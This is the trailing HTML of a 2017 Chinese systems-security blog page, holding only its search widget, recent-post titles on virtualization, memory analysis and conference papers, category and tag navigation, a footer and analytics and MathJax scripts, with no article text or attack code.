            <input type="search" class="search-field" style="height: 42px;" placeholder=" 搜索…" value="" name="s" title="Search for:">
        </label>
        <input type="submit" class="search-form-submit" value="搜索">
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(无标题)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div>
</div>
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">集思广益</h3>
      <p>我们推崇的是黑客与分享精神，如果您觉得本站对您有帮助，不妨自己也参与进来共同建设，期待您能推荐好文章或投稿至本站，
让更多人受益。本站长期招募志愿者与勤工俭学者参与本站的维护和建设，您可通过邮件csyssec@hotmail.com联系我们</p>
       <div class="widget widget_athemes_social_icons">

    	<ul class="clearfix widget-social-icons">   
    	
   			<li><a href="null" title="Words"><i class="fa fa-words" aria-hidden="true"></i></a></li> 

   		
   		</ul>


   		<!--
   		<ul class="clearfix widget-social-icons">   		
   		<li class="widget-si-twitter"><a href="http://twitter.com" title="Twitter"><i class="ico-twitter"></i></a> </li> 
		<li class="widget-si-facebook"><a href="http://facebook.com" title="Facebook"><i class="ico-facebook"></i></a></li>
			<li class="widget-si-gplus"><a href="http://plus.google.com" title="Google+"><i class="ico-gplus"></i></a></li>
			<li class="widget-si-pinterest"><a href="http://pinterest.com" title="Pinterest"><i class="ico-pinterest"></i></a></li>
			<li class="widget-si-flickr"><a href="http://flickr.com" title="Flickr"><i class="ico-flickr"></i></a></li>
			<li class="widget-si-instagram"><a href="http://instagram.com" title="Instagram"><i class="ico-instagram"></i></a></li>


        	</ul> -->

    </div>
  </div>


  
    
  <div class="widget_athemes_tabs">
    <ul id="widget-tab" class="clearfix widget-tab-nav">
      <li class="active"><a>最新推荐</a></li>
    </ul>
    <div class="widget">
      <ul>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170315/valgrind-memcheck/">如何使用Valgrind memcheck工具进行C/C++的内存漏洞检测</a></h6>
          <!--  <span>三月 15, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170312/phd-expectations-realities/">PhD expectations and reality</a></h6>
          <!--  <span>三月 12, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170312/paperwriting-collaboration/">On collaborative (remote) paper writing</a></h6>
          <!--  <span>三月 12, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170307/conference-veetenyears/">VEE十年录用论文</a></h6>
          <!--  <span>三月 7, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170307/conference-asplos2017/">ASPLOS 2017 Accepted Papers</a></h6>
          <!--  <span>三月 7, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170307/conference-ndss2017/">NDSS 2017 Accepted Papers</a></h6>
          <!--  <span>三月 7, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170307/introspection-papers/">虚拟机监控论文推荐</a></h6>
          <!--  <span>三月 7, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170307/course-zhiqianglin2/">名人课堂-系统安全与二进制代码分析(上)</a></h6>
          <!--  <span>三月 7, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170306/course-zhiqianglin1/">名人课堂-高级数字取证与数据逆向工程</a></h6>
          <!--  <span>三月 6, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170302/drakvuf/">虚拟机监控-DRAKVUF</a></h6>
          <!--  <span>三月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170301/virtualization-overview/">虚拟化技术大观</a></h6>
          <!--  <span>三月 1, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170301/recordreplay-papers/">虚拟机记录与重放论文推荐</a></h6>
          <!--  <span>三月 1, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170301/compile-link/">理清编译链接的那些事儿</a></h6>
          <!--  <span>三月 1, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170301/kernel-malloc/">深入理解Linux内存分配</a></h6>
          <!--  <span>三月 1, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170301/pvops/">Hook内核之PVOPS</a></h6>
          <!--  <span>三月 1, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170226/course-fengweizhang1/">名人课堂-计算机安全</a></h6>
          <!--  <span>二月 26, 2017</span> -->
            </div>

          </li>
        
      </ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类导航</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/博士之路/">博士之路</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签导航</h3>
    <div class="widget tagcloud">
      <a href="/tags/ASLR/" style="font-size: 11.82px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.91px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.73px;">Conference</a> <a href="/tags/Course/" style="font-size: 13.64px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.27px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/Heap/" style="font-size: 10.91px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.91px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.55px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.36px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 15.45px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.64px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.64px;">Linux</a> <a href="/tags/Malware/" style="font-size: 10.91px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.64px;">Memory</a> <a href="/tags/Migration/" style="font-size: 10.91px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.91px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.91px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.73px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15.45px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 10.91px;">Stack</a> <a href="/tags/System/" style="font-size: 19.09px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.82px;">Systemcall</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 18.18px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 10px;">XEN</a>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      版权所有&copy; 2017 Index of Computer System and Security 保留所有权利.
      </div>
      <div class="site-credit">
       <!--  自豪地使用 <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a> --> 
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
</script>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/syssec" class="mobile-nav-link">Syssec</a>
  
    <a href="/architecture" class="mobile-nav-link">Architecture</a>
  
    <a href="/virtualization" class="mobile-nav-link">Virtualization</a>
  
    <a href="/malware" class="mobile-nav-link">Malware</a>
  
    <a href="/conferences" class="mobile-nav-link">Conferences</a>
  
    <a href="/courses" class="mobile-nav-link">Courses</a>
  
    <a href="/academy" class="mobile-nav-link">Academy</a>
  
    <a href="/contribution" class="mobile-nav-link">Contribution</a>
  
    <a href="/donation" class="mobile-nav-link">Donation</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>





  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
  

  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261078922&web_id=1261078922" language="JavaScript"></script>
  </div>


</body>
</html>
